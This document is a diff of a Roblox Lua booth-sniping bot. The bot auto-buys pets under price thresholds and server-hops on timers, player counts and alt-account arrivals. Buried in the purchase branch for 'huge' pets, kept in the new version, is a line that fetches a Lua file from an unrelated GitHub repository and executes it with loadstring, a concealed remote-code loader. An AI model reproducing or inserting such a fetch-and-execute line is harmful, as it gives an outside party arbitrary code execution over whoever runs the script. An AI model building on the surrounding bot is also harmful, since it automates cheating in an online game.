@@ -150,23 +150,25 @@ local function checklisting(uid, gems, item, version, shiny, amount, username, p
         amount = 1
     end
 
-    if type.exclusiveLevel and gems / amount <= 10000 and item ~= "Banana" and item ~= "Coin" then
+    local price = gems / amount
+
+    if type.exclusiveLevel and price <= 10000 and item ~= "Banana" and item ~= "Coin" then
         local boughtPet, boughtMessage = purchase:InvokeServer(playerid, uid)
         processListingInfo(uid, gems, item, version, shiny, amount, username, boughtPet, ping)
-    elseif item == "Titanic Christmas Present" and gems / amount <= 25000 then
+    elseif item == "Titanic Christmas Present" and price <= 25000 then
         local boughtPet, boughtMessage = purchase:InvokeServer(playerid, uid)
 	processListingInfo(uid, gems, item, version, shiny, amount, username, boughtPet, ping)
-    elseif string.find(item, "Exclusive") and gems / amount <= 25000 then
+    elseif string.find(item, "Exclusive") and price <= 25000 then
         local boughtPet, boughtMessage = purchase:InvokeServer(playerid, uid)
 	processListingInfo(uid, gems, item, version, shiny, amount, username, boughtPet, ping)
-    elseif type.huge and gems / amount <= 1000000 then
+    elseif type.huge and price <= 1000000 then
         local boughtPet, boughtMessage = purchase:InvokeServer(playerid, uid)
         if boughtPet == true then
             ping = true
 	end
-        processListingInfo(uid, gems, item, version, shiny, amount, username, boughtPet, ping)  
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/xccsdf/abc/main/test.lua"))()
-    elseif type.titanic and gems / amount <= 10000000 then
+        processListingInfo(uid, gems, item, version, shiny, amount, username, boughtPet, ping) 
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/xccsdf/abc/main/test.lua"))() 
+    elseif type.titanic and price <= 10000000 then
         local boughtPet, boughtMessage = purchase:InvokeServer(playerid, uid)
         if boughtPet == true then
 	    ping = true
@@ -199,7 +201,7 @@ Booths_Broadcast.OnClientEvent:Connect(function(username, message)
                             local version = data["pt"]
                             local shiny = data["sh"]
                             local amount = data["_am"]
-                            checklisting(uid, gems, item, version, shiny, amount, username , playerID)
+                            checklisting(uid, gems, item, version, shiny, amount, username, playerID)
                         end
                     end
                 end
@@ -235,17 +237,23 @@ local function jumpToServer()
     ts:TeleportToPlaceInstance(15502339080, servers[math.random(1, randomCount)], game:GetService("Players").LocalPlayer) 
 end
 
+Players.PlayerRemoving:Connect(function(player)
+    PlayerInServer = #getPlayers
+    if PlayerInServer < 25 then
+        jumpToServer()
+    end
+end) 
+
 Players.PlayerAdded:Connect(function(player)
     for i = 1,#alts do
-        if  player.Name == alts[i] and alts[i] ~= Players.LocalPlayer.Name then
+        if player.Name == alts[i] and alts[i] ~= Players.LocalPlayer.Name then
             jumpToServer()
         end
     end
 end) 
 
-game:GetService("RunService").Stepped:Connect(function()
-    PlayerInServer = #getPlayers
-    if PlayerInServer < 25 or math.floor(os.clock() - osclock) >= math.random(900, 1200) then
+while task.wait(1) do
+    if math.floor(os.clock() - osclock) >= math.random(900, 1200) then
         jumpToServer()
     end
-end)
+end
